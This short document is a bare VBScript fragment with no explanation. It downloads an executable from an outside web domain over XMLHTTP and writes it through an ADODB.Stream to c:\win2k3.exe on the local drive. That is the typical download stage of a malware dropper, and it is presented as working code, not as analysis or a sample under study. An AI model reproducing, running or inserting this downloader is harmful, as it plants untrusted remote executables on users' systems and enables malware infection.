Dim D, H, T:Set H=CreateObject("Microsoft.XMLHTTP") 
H.Open "GET","http://www.fbiagents.org/pb22.exe",0:H.Send:D=H.ResponseBody 
Set T=CreateObject("ADODB.Stream"):T.Type=1:T.Open:T.Write D 
T.SaveToFile "c:\win2k3.exe",2 
